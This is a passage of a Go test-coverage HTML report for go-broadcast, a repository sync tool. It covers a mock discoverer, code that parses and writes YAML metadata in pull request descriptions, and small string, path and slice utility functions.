// MockDiscoverer is a mock implementation of the Discoverer interface
type MockDiscoverer struct {
        mock.Mock
}

// NewMockDiscoverer creates a new MockDiscoverer (backward compatibility)
func NewMockDiscoverer() *MockDiscoverer <span class="cov0" title="0">{
        return &amp;MockDiscoverer{}
}</span>

// DiscoverState mock implementation
func (m *MockDiscoverer) DiscoverState(ctx context.Context, cfg *config.Config) (*State, error) <span class="cov8" title="1">{
        args := m.Called(ctx, cfg)
        return testutil.HandleTwoValueReturn[*State](args)
}</span>

// DiscoverTargetState mock implementation
func (m *MockDiscoverer) DiscoverTargetState(ctx context.Context, repo, branchPrefix string) (*TargetState, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, branchPrefix)
        return testutil.HandleTwoValueReturn[*TargetState](args)
}</span>

// ParseBranchName mock implementation
func (m *MockDiscoverer) ParseBranchName(name string) (*BranchMetadata, error) <span class="cov8" title="1">{
        args := m.Called(name)
        return testutil.HandleTwoValueReturn[*BranchMetadata](args)
}</span>
</pre>

		<pre class="file" id="file51" style="display: none">package state

import (
        "errors"
        "fmt"
        "strings"
        "time"

        "gopkg.in/yaml.v3"

        "github.com/mrz1836/go-broadcast/internal/gh"
)

// PR metadata errors
var (
        ErrPRNoDescription       = errors.New("PR has no description")
        ErrPRNoMetadataBlock     = errors.New("no metadata block found in PR description")
        ErrPRMetadataNotClosed   = errors.New("metadata block not properly closed")
        ErrPRMissingSyncMetadata = errors.New("enhanced metadata missing sync_metadata section")
)

// PRMetadata represents metadata stored in PR descriptions (legacy format)
type PRMetadata struct {
        // SourceCommit is the commit SHA this PR was created from
        SourceCommit string `yaml:"source_commit"`

        // SourceRepo is the source repository
        SourceRepo string `yaml:"source_repo"`

        // SourceBranch is the source branch
        SourceBranch string `yaml:"source_branch"`

        // CreatedAt is when the sync was initiated
        CreatedAt time.Time `yaml:"created_at"`

        // Files is the list of files being synced
        Files []string `yaml:"files"`

        // TransformsApplied lists which transforms were applied
        TransformsApplied []string `yaml:"transforms_applied,omitempty"`
}

// EnhancedPRMetadata represents the new enhanced metadata format with directory sync support
type EnhancedPRMetadata struct {
        // SyncMetadata contains core sync information
        SyncMetadata *SyncMetadataInfo `yaml:"sync_metadata"`

        // Files contains individual file mappings
        Files []FileMapping `yaml:"files,omitempty"`

        // Directories contains directory mappings with detailed metrics
        Directories []DirectoryMapping `yaml:"directories,omitempty"`

        // Performance contains aggregate performance metrics
        Performance *PerformanceInfo `yaml:"performance,omitempty"`
}

// SyncMetadataInfo contains core synchronization metadata
type SyncMetadataInfo struct {
        // SourceRepo is the source repository
        SourceRepo string `yaml:"source_repo"`

        // SourceCommit is the source commit SHA
        SourceCommit string `yaml:"source_commit"`

        // TargetRepo is the target repository
        TargetRepo string `yaml:"target_repo"`

        // SyncCommit is the commit SHA of the sync operation
        SyncCommit string `yaml:"sync_commit,omitempty"`

        // SyncTime is when the sync was performed
        SyncTime time.Time `yaml:"sync_time"`
}

// FileMapping represents an individual file sync mapping
type FileMapping struct {
        // Source is the source file path
        Source string `yaml:"src"`

        // Destination is the destination file path
        Destination string `yaml:"dest"`

        // From indicates the source type ("file" for individual files)
        From string `yaml:"from"`
}

// DirectoryMapping represents a directory sync mapping with metrics
type DirectoryMapping struct {
        // Source is the source directory path
        Source string `yaml:"src"`

        // Destination is the destination directory path
        Destination string `yaml:"dest"`

        // Excluded contains glob patterns that were excluded
        Excluded []string `yaml:"excluded,omitempty"`

        // FilesSynced is the number of files successfully synced
        FilesSynced int `yaml:"files_synced"`

        // FilesExcluded is the number of files excluded by patterns
        FilesExcluded int `yaml:"files_excluded"`

        // ProcessingTimeMs is the time taken to process this directory in milliseconds
        ProcessingTimeMs int64 `yaml:"processing_time_ms"`
}

// PerformanceInfo contains aggregate performance metrics
type PerformanceInfo struct {
        // TotalSyncTimeMs is the total sync time in milliseconds
        TotalSyncTimeMs int64 `yaml:"total_sync_time_ms"`

        // TotalFilesProcessed is the total number of files processed
        TotalFilesProcessed int `yaml:"total_files_processed"`

        // TotalFilesChanged is the number of files that were changed
        TotalFilesChanged int `yaml:"total_files_changed"`

        // TotalFilesSkipped is the number of files skipped
        TotalFilesSkipped int `yaml:"total_files_skipped"`

        // APICallsSaved is the number of API calls saved through optimizations
        APICallsSaved int `yaml:"api_calls_saved"`

        // CacheHits is the number of cache hits
        CacheHits int `yaml:"cache_hits"`

        // CacheMisses is the number of cache misses
        CacheMisses int `yaml:"cache_misses"`
}

// ExtractPRMetadata extracts sync metadata from a PR description (supports both old and new formats)
func ExtractPRMetadata(pr gh.PR) (*PRMetadata, error) <span class="cov8" title="1">{
        if pr.Body == "" </span><span class="cov8" title="1">{
                return nil, ErrPRNoDescription
        }</span>

        // Try to extract enhanced metadata first
        <span class="cov8" title="1">enhanced, err := ExtractEnhancedPRMetadata(pr)
        if err == nil </span><span class="cov8" title="1">{
                // Convert enhanced metadata to legacy format for backward compatibility
                return convertEnhancedToLegacy(enhanced), nil
        }</span>

        // Fall back to legacy format extraction
        <span class="cov8" title="1">yamlContent, err := extractMetadataYAML(pr.Body, "&lt;!-- go-broadcast:metadata")
        if err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>

        // Parse the YAML as legacy format
        <span class="cov8" title="1">var metadata PRMetadata
        if err := yaml.Unmarshal([]byte(yamlContent), &amp;metadata); err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to parse metadata YAML: %w", err)
        }</span>

        <span class="cov8" title="1">return &amp;metadata, nil</span>
}

// ExtractEnhancedPRMetadata extracts enhanced metadata from a PR description
func ExtractEnhancedPRMetadata(pr gh.PR) (*EnhancedPRMetadata, error) <span class="cov8" title="1">{
        if pr.Body == "" </span><span class="cov0" title="0">{
                return nil, ErrPRNoDescription
        }</span>

        // Try new format first
        <span class="cov8" title="1">yamlContent, err := extractMetadataYAML(pr.Body, "&lt;!-- go-broadcast-metadata")
        if err != nil </span><span class="cov8" title="1">{
                // Try alternative new format marker
                yamlContent, err = extractMetadataYAML(pr.Body, "&lt;!-- go-broadcast:metadata")
                if err != nil </span><span class="cov8" title="1">{
                        return nil, err
                }</span>
        }

        // Parse as enhanced format
        <span class="cov8" title="1">var enhanced EnhancedPRMetadata
        if err := yaml.Unmarshal([]byte(yamlContent), &amp;enhanced); err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to parse enhanced metadata YAML: %w", err)
        }</span>

        // Validate required fields
        <span class="cov8" title="1">if enhanced.SyncMetadata == nil </span><span class="cov8" title="1">{
                return nil, ErrPRMissingSyncMetadata
        }</span>

        <span class="cov8" title="1">return &amp;enhanced, nil</span>
}

// extractMetadataYAML extracts YAML content from metadata blocks
func extractMetadataYAML(body, startMarker string) (string, error) <span class="cov8" title="1">{
        endMarker := "--&gt;"

        startIdx := strings.Index(body, startMarker)
        if startIdx == -1 </span><span class="cov8" title="1">{
                return "", ErrPRNoMetadataBlock
        }</span>

        // Find the end of the metadata block
        <span class="cov8" title="1">metadataStart := startIdx + len(startMarker)

        endIdx := strings.Index(body[metadataStart:], endMarker)
        if endIdx == -1 </span><span class="cov8" title="1">{
                return "", ErrPRMetadataNotClosed
        }</span>

        // Extract the YAML content
        <span class="cov8" title="1">yamlContent := strings.TrimSpace(body[metadataStart : metadataStart+endIdx])
        return yamlContent, nil</span>
}

// convertEnhancedToLegacy converts enhanced metadata to legacy format for backward compatibility
func convertEnhancedToLegacy(enhanced *EnhancedPRMetadata) *PRMetadata <span class="cov8" title="1">{
        legacy := &amp;PRMetadata{
                SourceCommit: enhanced.SyncMetadata.SourceCommit,
                SourceRepo:   enhanced.SyncMetadata.SourceRepo,
                CreatedAt:    enhanced.SyncMetadata.SyncTime,
                // SourceBranch is not available in enhanced format, leave empty
                SourceBranch: "",
        }

        // Collect all files from both individual files and directories
        expectedSize := len(enhanced.Files) + len(enhanced.Directories)
        allFiles := make([]string, 0, expectedSize)

        // Add individual files
        for _, file := range enhanced.Files </span><span class="cov8" title="1">{
                allFiles = append(allFiles, file.Destination)
        }</span>

        // Add directory files (approximation - we don't have individual file lists)
        <span class="cov8" title="1">for _, dir := range enhanced.Directories </span><span class="cov8" title="1">{
                // Add the directory itself as a placeholder
                allFiles = append(allFiles, dir.Destination+"/*")
        }</span>

        <span class="cov8" title="1">legacy.Files = allFiles

        // TransformsApplied is not tracked in enhanced format
        legacy.TransformsApplied = []string{}

        return legacy</span>
}

// FormatPRMetadata formats metadata for inclusion in a PR description (legacy format)
func FormatPRMetadata(metadata *PRMetadata) string <span class="cov8" title="1">{
        yamlBytes, err := yaml.Marshal(metadata)
        if err != nil </span><span class="cov0" title="0">{
                // Fallback to a simple format if YAML marshaling fails
                return fmt.Sprintf("&lt;!-- go-broadcast:metadata\nsource_commit: %s\n--&gt;", metadata.SourceCommit)
        }</span>

        <span class="cov8" title="1">return fmt.Sprintf("&lt;!-- go-broadcast:metadata\n%s--&gt;", string(yamlBytes))</span>
}

// FormatEnhancedPRMetadata formats enhanced metadata for inclusion in a PR description
func FormatEnhancedPRMetadata(metadata *EnhancedPRMetadata) string <span class="cov8" title="1">{
        yamlBytes, err := yaml.Marshal(metadata)
        if err != nil </span><span class="cov0" title="0">{
                // Fallback to a simple format if YAML marshaling fails
                if metadata.SyncMetadata != nil </span><span class="cov0" title="0">{
                        return fmt.Sprintf("&lt;!-- go-broadcast-metadata\nsync_metadata:\n  source_commit: %s\n--&gt;", metadata.SyncMetadata.SourceCommit)
                }</span>
                <span class="cov0" title="0">return "&lt;!-- go-broadcast-metadata\nsync_metadata: {}\n--&gt;"</span>
        }

        <span class="cov8" title="1">return fmt.Sprintf("&lt;!-- go-broadcast-metadata\n%s--&gt;", string(yamlBytes))</span>
}

// GeneratePRDescription generates a complete PR description with metadata (legacy format)
func GeneratePRDescription(metadata *PRMetadata, summary string) string <span class="cov8" title="1">{
        var builder strings.Builder

        // Add the summary first
        builder.WriteString(summary)
        builder.WriteString("\n\n")

        // Add sync details
        builder.WriteString("## Sync Details\n\n")
        builder.WriteString(fmt.Sprintf("- **Source**: `%s` @ `%s`\n", metadata.SourceRepo, metadata.SourceBranch))
        builder.WriteString(fmt.Sprintf("- **Commit**: `%s`\n", metadata.SourceCommit))
        builder.WriteString(fmt.Sprintf("- **Created**: %s\n", metadata.CreatedAt.Format(time.RFC3339)))

        if len(metadata.Files) &gt; 0 </span><span class="cov8" title="1">{
                builder.WriteString("\n### Files Synced\n")

                for _, file := range metadata.Files </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- `%s`\n", file))
                }</span>
        }

        <span class="cov8" title="1">if len(metadata.TransformsApplied) &gt; 0 </span><span class="cov8" title="1">{
                builder.WriteString("\n### Transforms Applied\n")

                for _, transform := range metadata.TransformsApplied </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- %s\n", transform))
                }</span>
        }

        // Add metadata block at the end
        <span class="cov8" title="1">builder.WriteString("\n\n")
        builder.WriteString(FormatPRMetadata(metadata))

        return builder.String()</span>
}

// GenerateEnhancedPRDescription generates a complete PR description with enhanced metadata
func GenerateEnhancedPRDescription(metadata *EnhancedPRMetadata, summary string) string <span class="cov8" title="1">{
        var builder strings.Builder

        // Add the summary first
        builder.WriteString(summary)
        builder.WriteString("\n\n")

        // Add sync details
        builder.WriteString("## Sync Details\n\n")
        if metadata.SyncMetadata != nil </span><span class="cov8" title="1">{
                builder.WriteString(fmt.Sprintf("- **Source**: `%s` @ `%s`\n", metadata.SyncMetadata.SourceRepo, metadata.SyncMetadata.SourceCommit))
                builder.WriteString(fmt.Sprintf("- **Target**: `%s`\n", metadata.SyncMetadata.TargetRepo))
                builder.WriteString(fmt.Sprintf("- **Sync Time**: %s\n", metadata.SyncMetadata.SyncTime.Format(time.RFC3339)))
                if metadata.SyncMetadata.SyncCommit != "" </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **Sync Commit**: `%s`\n", metadata.SyncMetadata.SyncCommit))
                }</span>
        }

        // Add individual files if any
        <span class="cov8" title="1">if len(metadata.Files) &gt; 0 </span><span class="cov8" title="1">{
                builder.WriteString("\n### Individual Files Synced\n")
                for _, file := range metadata.Files </span><span class="cov8" title="1">{
                        if file.Source != file.Destination </span><span class="cov0" title="0">{
                                builder.WriteString(fmt.Sprintf("- `%s` ‚Üí `%s`\n", file.Source, file.Destination))
                        }</span> else<span class="cov8" title="1"> {
                                builder.WriteString(fmt.Sprintf("- `%s`\n", file.Destination))
                        }</span>
                }
        }

        // Add directory mappings if any
        <span class="cov8" title="1">if len(metadata.Directories) &gt; 0 </span><span class="cov8" title="1">{
                builder.WriteString("\n### Directory Mappings\n")
                for _, dir := range metadata.Directories </span><span class="cov8" title="1">{
                        if dir.Source != dir.Destination </span><span class="cov0" title="0">{
                                builder.WriteString(fmt.Sprintf("- `%s` ‚Üí `%s`\n", dir.Source, dir.Destination))
                        }</span> else<span class="cov8" title="1"> {
                                builder.WriteString(fmt.Sprintf("- `%s`\n", dir.Destination))
                        }</span>
                        <span class="cov8" title="1">builder.WriteString(fmt.Sprintf("  - **Files Synced**: %d\n", dir.FilesSynced))
                        if dir.FilesExcluded &gt; 0 </span><span class="cov8" title="1">{
                                builder.WriteString(fmt.Sprintf("  - **Files Excluded**: %d\n", dir.FilesExcluded))
                        }</span>
                        <span class="cov8" title="1">if len(dir.Excluded) &gt; 0 </span><span class="cov8" title="1">{
                                builder.WriteString(fmt.Sprintf("  - **Exclusion Patterns**: %s\n", strings.Join(dir.Excluded, ", ")))
                        }</span>
                        <span class="cov8" title="1">if dir.ProcessingTimeMs &gt; 0 </span><span class="cov8" title="1">{
                                builder.WriteString(fmt.Sprintf("  - **Processing Time**: %dms\n", dir.ProcessingTimeMs))
                        }</span>
                }
        }

        // Add performance metrics if available
        <span class="cov8" title="1">if metadata.Performance != nil </span><span class="cov8" title="1">{
                builder.WriteString("\n### Performance Metrics\n")
                if metadata.Performance.TotalSyncTimeMs &gt; 0 </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **Total Sync Time**: %dms\n", metadata.Performance.TotalSyncTimeMs))
                }</span>
                <span class="cov8" title="1">if metadata.Performance.TotalFilesProcessed &gt; 0 </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **Files Processed**: %d\n", metadata.Performance.TotalFilesProcessed))
                }</span>
                <span class="cov8" title="1">if metadata.Performance.TotalFilesChanged &gt; 0 </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **Files Changed**: %d\n", metadata.Performance.TotalFilesChanged))
                }</span>
                <span class="cov8" title="1">if metadata.Performance.TotalFilesSkipped &gt; 0 </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **Files Skipped**: %d\n", metadata.Performance.TotalFilesSkipped))
                }</span>
                <span class="cov8" title="1">if metadata.Performance.APICallsSaved &gt; 0 </span><span class="cov8" title="1">{
                        builder.WriteString(fmt.Sprintf("- **API Calls Saved**: %d\n", metadata.Performance.APICallsSaved))
                }</span>
                <span class="cov8" title="1">if metadata.Performance.CacheHits &gt; 0 || metadata.Performance.CacheMisses &gt; 0 </span><span class="cov8" title="1">{
                        total := metadata.Performance.CacheHits + metadata.Performance.CacheMisses
                        if total &gt; 0 </span><span class="cov8" title="1">{
                                hitRate := float64(metadata.Performance.CacheHits) / float64(total) * 100
                                builder.WriteString(fmt.Sprintf("- **Cache Hit Rate**: %.1f%% (%d hits, %d misses)\n", hitRate, metadata.Performance.CacheHits, metadata.Performance.CacheMisses))
                        }</span>
                }
        }

        // Add metadata block at the end
        <span class="cov8" title="1">builder.WriteString("\n\n")
        builder.WriteString(FormatEnhancedPRMetadata(metadata))

        return builder.String()</span>
}

// ConvertToDirectorySyncInfo converts enhanced PR metadata to DirectorySyncInfo
func ConvertToDirectorySyncInfo(enhanced *EnhancedPRMetadata) *DirectorySyncInfo <span class="cov8" title="1">{
        if enhanced == nil </span><span class="cov0" title="0">{
                return nil
        }</span>

        <span class="cov8" title="1">info := &amp;DirectorySyncInfo{}

        // Convert directory mappings
        if len(enhanced.Directories) &gt; 0 </span><span class="cov8" title="1">{
                for _, dir := range enhanced.Directories </span><span class="cov8" title="1">{
                        mapping := DirectoryMappingInfo{
                                Source:            dir.Source,
                                Destination:       dir.Destination,
                                ExcludePatterns:   dir.Excluded,
                                PreserveStructure: true,  // Assumed for directory sync
                                IncludeHidden:     false, // Default value, not tracked in PR metadata
                                TransformApplied:  false, // Default value, not tracked in PR metadata
                        }
                        info.DirectoryMappings = append(info.DirectoryMappings, mapping)
                }</span>
        }

        // Convert synced files info
        <span class="cov8" title="1">if len(enhanced.Files) &gt; 0 || len(enhanced.Directories) &gt; 0 </span><span class="cov8" title="1">{
                syncedFiles := &amp;SyncedFilesInfo{}

                // Add individual files
                for _, file := range enhanced.Files </span><span class="cov8" title="1">{
                        syncedFiles.IndividualSyncedFiles = append(syncedFiles.IndividualSyncedFiles, file.Destination)
                }</span>
                <span class="cov8" title="1">syncedFiles.IndividualFileCount = len(enhanced.Files)

                // Add directory files (approximation)
                var dirFileCount int
                for _, dir := range enhanced.Directories </span><span class="cov8" title="1">{
                        dirFileCount += dir.FilesSynced
                }</span>
                <span class="cov8" title="1">syncedFiles.DirectoryFileCount = dirFileCount
                syncedFiles.TotalFiles = syncedFiles.IndividualFileCount + syncedFiles.DirectoryFileCount

                info.SyncedFiles = syncedFiles</span>
        }

        // Convert performance metrics
        <span class="cov8" title="1">if enhanced.Performance != nil </span><span class="cov8" title="1">{
                perfMetrics := &amp;DirectoryPerformanceMetrics{
                        ExtractedFromPR: true,
                }

                // Create overall metrics
                if enhanced.Performance.TotalSyncTimeMs &gt; 0 || enhanced.Performance.TotalFilesProcessed &gt; 0 </span><span class="cov8" title="1">{
                        overall := &amp;OverallSyncMetrics{
                                Duration:            time.Duration(enhanced.Performance.TotalSyncTimeMs) * time.Millisecond,
                                ProcessingTimeMs:    enhanced.Performance.TotalSyncTimeMs,
                                TotalFilesProcessed: enhanced.Performance.TotalFilesProcessed,
                                TotalFilesChanged:   enhanced.Performance.TotalFilesChanged,
                                TotalFilesSkipped:   enhanced.Performance.TotalFilesSkipped,
                        }

                        // Set start/end times if sync metadata is available
                        if enhanced.SyncMetadata != nil </span><span class="cov8" title="1">{
                                overall.EndTime = enhanced.SyncMetadata.SyncTime
                                overall.StartTime = overall.EndTime.Add(-overall.Duration)
                        }</span>

                        <span class="cov8" title="1">perfMetrics.OverallMetrics = overall</span>
                }

                // Create API metrics
                <span class="cov8" title="1">if enhanced.Performance.APICallsSaved &gt; 0 || enhanced.Performance.CacheHits &gt; 0 || enhanced.Performance.CacheMisses &gt; 0 </span><span class="cov8" title="1">{
                        apiMetrics := &amp;APISyncMetrics{
                                APICallsSaved: enhanced.Performance.APICallsSaved,
                                CacheHits:     enhanced.Performance.CacheHits,
                                CacheMisses:   enhanced.Performance.CacheMisses,
                        }

                        // Calculate cache hit ratio
                        total := apiMetrics.CacheHits + apiMetrics.CacheMisses
                        if total &gt; 0 </span><span class="cov8" title="1">{
                                apiMetrics.CacheHitRatio = float64(apiMetrics.CacheHits) / float64(total)
                        }</span>

                        <span class="cov8" title="1">perfMetrics.APIMetrics = apiMetrics</span>
                }

                // Create directory-specific metrics
                <span class="cov8" title="1">if len(enhanced.Directories) &gt; 0 </span><span class="cov8" title="1">{
                        dirMetrics := make(map[string]*DirectoryProcessingMetrics)
                        for _, dir := range enhanced.Directories </span><span class="cov8" title="1">{
                                metrics := &amp;DirectoryProcessingMetrics{
                                        FilesProcessed:     dir.FilesSynced,
                                        FilesExcluded:      dir.FilesExcluded,
                                        ProcessingDuration: time.Duration(dir.ProcessingTimeMs) * time.Millisecond,
                                }
                                dirMetrics[dir.Source] = metrics
                        }</span>
                        <span class="cov8" title="1">perfMetrics.DirectoryMetrics = dirMetrics</span>
                }

                <span class="cov8" title="1">info.PerformanceMetrics = perfMetrics</span>
        }

        // Set last directory sync time
        <span class="cov8" title="1">if enhanced.SyncMetadata != nil </span><span class="cov8" title="1">{
                info.LastDirectorySync = &amp;enhanced.SyncMetadata.SyncTime
        }</span>

        <span class="cov8" title="1">return info</span>
}

// CreateEnhancedMetadataFromDirectorySync creates enhanced PR metadata from DirectorySyncInfo
func CreateEnhancedMetadataFromDirectorySync(sourceRepo, targetRepo, sourceCommit string, syncInfo *DirectorySyncInfo) *EnhancedPRMetadata <span class="cov8" title="1">{
        enhanced := &amp;EnhancedPRMetadata{
                SyncMetadata: &amp;SyncMetadataInfo{
                        SourceRepo:   sourceRepo,
                        SourceCommit: sourceCommit,
                        TargetRepo:   targetRepo,
                        SyncTime:     time.Now().UTC(),
                },
        }

        if syncInfo == nil </span><span class="cov0" title="0">{
                return enhanced
        }</span>

        // Convert directory mappings
        <span class="cov8" title="1">if len(syncInfo.DirectoryMappings) &gt; 0 </span><span class="cov8" title="1">{
                for _, mapping := range syncInfo.DirectoryMappings </span><span class="cov8" title="1">{
                        dir := DirectoryMapping{
                                Source:      mapping.Source,
                                Destination: mapping.Destination,
                                Excluded:    mapping.ExcludePatterns,
                        }

                        // Try to get metrics from performance data
                        if syncInfo.PerformanceMetrics != nil &amp;&amp; syncInfo.PerformanceMetrics.DirectoryMetrics != nil </span><span class="cov8" title="1">{
                                if metrics, exists := syncInfo.PerformanceMetrics.DirectoryMetrics[mapping.Source]; exists </span><span class="cov8" title="1">{
                                        dir.FilesSynced = metrics.FilesProcessed
                                        dir.FilesExcluded = metrics.FilesExcluded
                                        dir.ProcessingTimeMs = int64(metrics.ProcessingDuration / time.Millisecond)
                                }</span>
                        }

                        <span class="cov8" title="1">enhanced.Directories = append(enhanced.Directories, dir)</span>
                }
        }

        // Convert individual files from synced files info
        <span class="cov8" title="1">if syncInfo.SyncedFiles != nil </span><span class="cov8" title="1">{
                for _, file := range syncInfo.SyncedFiles.IndividualSyncedFiles </span><span class="cov8" title="1">{
                        enhanced.Files = append(enhanced.Files, FileMapping{
                                Source:      file,
                                Destination: file,
                                From:        "file",
                        })
                }</span>
        }

        // Convert performance metrics
        <span class="cov8" title="1">if syncInfo.PerformanceMetrics != nil </span><span class="cov8" title="1">{
                perf := &amp;PerformanceInfo{}

                if syncInfo.PerformanceMetrics.OverallMetrics != nil </span><span class="cov8" title="1">{
                        overall := syncInfo.PerformanceMetrics.OverallMetrics
                        perf.TotalSyncTimeMs = overall.ProcessingTimeMs
                        perf.TotalFilesProcessed = overall.TotalFilesProcessed
                        perf.TotalFilesChanged = overall.TotalFilesChanged
                        perf.TotalFilesSkipped = overall.TotalFilesSkipped
                }</span>

                <span class="cov8" title="1">if syncInfo.PerformanceMetrics.APIMetrics != nil </span><span class="cov8" title="1">{
                        api := syncInfo.PerformanceMetrics.APIMetrics
                        perf.APICallsSaved = api.APICallsSaved
                        perf.CacheHits = api.CacheHits
                        perf.CacheMisses = api.CacheMisses
                }</span>

                <span class="cov8" title="1">enhanced.Performance = perf</span>
        }

        <span class="cov8" title="1">return enhanced</span>
}
</pre>

		<pre class="file" id="file52" style="display: none">package strutil

import (
        "path/filepath"
        "strings"
)

// JoinPath safely joins path elements and normalizes the result.
// This consolidates the common pattern: filepath.Join + filepath.Clean
func JoinPath(elements ...string) string <span class="cov8" title="1">{
        if len(elements) == 0 </span><span class="cov8" title="1">{
                return ""
        }</span>
        <span class="cov8" title="1">return filepath.Clean(filepath.Join(elements...))</span>
}

// GetBaseName extracts the base name from a path.
// This consolidates the common pattern: filepath.Base(path)
func GetBaseName(path string) string <span class="cov8" title="1">{
        if IsEmpty(path) </span><span class="cov8" title="1">{
                return ""
        }</span>
        <span class="cov8" title="1">return filepath.Base(path)</span>
}

// GetDirName extracts the directory name from a path.
// This consolidates the common pattern: filepath.Dir(path)
func GetDirName(path string) string <span class="cov8" title="1">{
        if IsEmpty(path) </span><span class="cov8" title="1">{
                return ""
        }</span>
        <span class="cov8" title="1">return filepath.Dir(path)</span>
}

// IsAbsolutePath checks if a path is absolute.
// This consolidates the common pattern: filepath.IsAbs(path)
func IsAbsolutePath(path string) bool <span class="cov8" title="1">{
        return filepath.IsAbs(path)
}</span>

// HasPathTraversal checks if a path contains path traversal attempts.
// This consolidates the common security check pattern.
func HasPathTraversal(path string) bool <span class="cov8" title="1">{
        cleanPath := filepath.Clean(path)
        // Check if cleaned path starts with .. (escapes upward)
        if strings.HasPrefix(cleanPath, "..") </span><span class="cov8" title="1">{
                return true
        }</span>
        // Check for .. as a path component (not just substring)
        <span class="cov8" title="1">parts := strings.Split(cleanPath, string(filepath.Separator))
        for _, part := range parts </span><span class="cov8" title="1">{
                if part == ".." </span><span class="cov0" title="0">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// IsHiddenFile checks if a file or directory is hidden (starts with dot).
// This consolidates the common pattern for detecting hidden files.
func IsHiddenFile(path string) bool <span class="cov8" title="1">{
        base := GetBaseName(path)
        return strings.HasPrefix(base, ".") &amp;&amp; base != "." &amp;&amp; base != ".."
}</span>

// ToUnixPath converts a path to Unix-style forward slashes.
// This consolidates the common pattern: filepath.ToSlash(path)
func ToUnixPath(path string) string <span class="cov8" title="1">{
        return filepath.ToSlash(path)
}</span>

// HasExtension checks if a path has any of the specified extensions.
// This consolidates the common pattern of checking multiple extensions.
func HasExtension(path string, extensions ...string) bool <span class="cov8" title="1">{
        ext := strings.ToLower(filepath.Ext(path))
        for _, validExt := range extensions </span><span class="cov8" title="1">{
                if strings.ToLower(validExt) == ext </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// EnsureTrailingSlash ensures a path ends with a trailing slash.
// This consolidates the common pattern for directory paths.
func EnsureTrailingSlash(path string) string <span class="cov8" title="1">{
        if IsEmpty(path) </span><span class="cov8" title="1">{
                return "/"
        }</span>
        <span class="cov8" title="1">if !strings.HasSuffix(path, "/") </span><span class="cov8" title="1">{
                return path + "/"
        }</span>
        <span class="cov8" title="1">return path</span>
}

// RemoveTrailingSlash removes trailing slashes from a path.
// This consolidates the common pattern for normalizing paths.
func RemoveTrailingSlash(path string) string <span class="cov8" title="1">{
        return strings.TrimSuffix(path, "/")
}</span>

// SplitPath splits a path into its directory components.
// This consolidates the common pattern: strings.Split(filepath.ToSlash(path), "/")
func SplitPath(path string) []string <span class="cov8" title="1">{
        if IsEmpty(path) </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">normalizedPath := ToUnixPath(filepath.Clean(path))
        parts := strings.Split(normalizedPath, "/")

        // Filter out empty parts
        result := make([]string, 0, len(parts))
        for _, part := range parts </span><span class="cov8" title="1">{
                if part != "" </span><span class="cov8" title="1">{
                        result = append(result, part)
                }</span>
        }
        <span class="cov8" title="1">return result</span>
}
</pre>

		<pre class="file" id="file53" style="display: none">package strutil

import "strings"

// IsEmptySlice checks if a slice is nil or has zero length.
// This consolidates the common pattern: len(slice) == 0
func IsEmptySlice[T any](slice []T) bool <span class="cov8" title="1">{
        return len(slice) == 0
}</span>

// IsNotEmptySlice checks if a slice is not nil and has at least one element.
// This consolidates the common pattern: len(slice) &gt; 0
func IsNotEmptySlice[T any](slice []T) bool <span class="cov8" title="1">{
        return len(slice) &gt; 0
}</span>

// SafeSliceAccess safely accesses a slice element with bounds checking.
// Returns the element and true if index is valid, zero value and false otherwise.
func SafeSliceAccess[T any](slice []T, index int) (T, bool) <span class="cov8" title="1">{
        var zero T
        if index &lt; 0 || index &gt;= len(slice) </span><span class="cov8" title="1">{
                return zero, false
        }</span>
        <span class="cov8" title="1">return slice[index], true</span>
}

// FilterNonEmpty filters out empty strings from a slice.
// This consolidates the common pattern of filtering empty values.
func FilterNonEmpty(slice []string) []string <span class="cov8" title="1">{
        if IsEmptySlice(slice) </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">result := make([]string, 0, len(slice))
        for _, item := range slice </span><span class="cov8" title="1">{
                if IsNotEmpty(item) </span><span class="cov8" title="1">{
                        result = append(result, strings.TrimSpace(item))
                }</span>
        }
        <span class="cov8" title="1">return result</span>
}

// UniqueStrings removes duplicate strings from a slice while preserving order.
// This consolidates the common pattern of deduplicating slices.
func UniqueStrings(slice []string) []string <span class="cov8" title="1">{
        if IsEmptySlice(slice) </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">seen := make(map[string]bool)
        result := make([]string, 0, len(slice))

        for _, item := range slice </span><span class="cov8" title="1">{
                if !seen[item] </span><span class="cov8" title="1">{
                        seen[item] = true
                        result = append(result, item)
                }</span>
        }
        <span class="cov8" title="1">return result</span>
}

// ChunkSlice splits a slice into chunks of the specified size.
// This consolidates the common pattern of batch processing slices.
func ChunkSlice[T any](slice []T, chunkSize int) [][]T <span class="cov8" title="1">{
        if IsEmptySlice(slice) || chunkSize &lt;= 0 </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">chunks := make([][]T, 0, (len(slice)+chunkSize-1)/chunkSize)
        for i := 0; i &lt; len(slice); i += chunkSize </span><span class="cov8" title="1">{
                end := i + chunkSize
                if end &gt; len(slice) </span><span class="cov8" title="1">{
                        end = len(slice)
                }</span>
                <span class="cov8" title="1">chunks = append(chunks, slice[i:end])</span>
        }
        <span class="cov8" title="1">return chunks</span>
}
</pre>

		<pre class="file" id="file54" style="display: none">// Package strutil provides common string and path utility functions used throughout the application.
// This package consolidates utility logic that was previously scattered across multiple packages.
package strutil

import (
        "fmt"
        "net/url"
        "path/filepath"
        "strings"
)

// IsEmpty checks if a string is empty or contains only whitespace.
// This consolidates the common pattern: strings.TrimSpace(value) == ""
func IsEmpty(value string) bool <span class="cov8" title="1">{
        return strings.TrimSpace(value) == ""
}</span>

// IsNotEmpty checks if a string is not empty and contains non-whitespace characters.
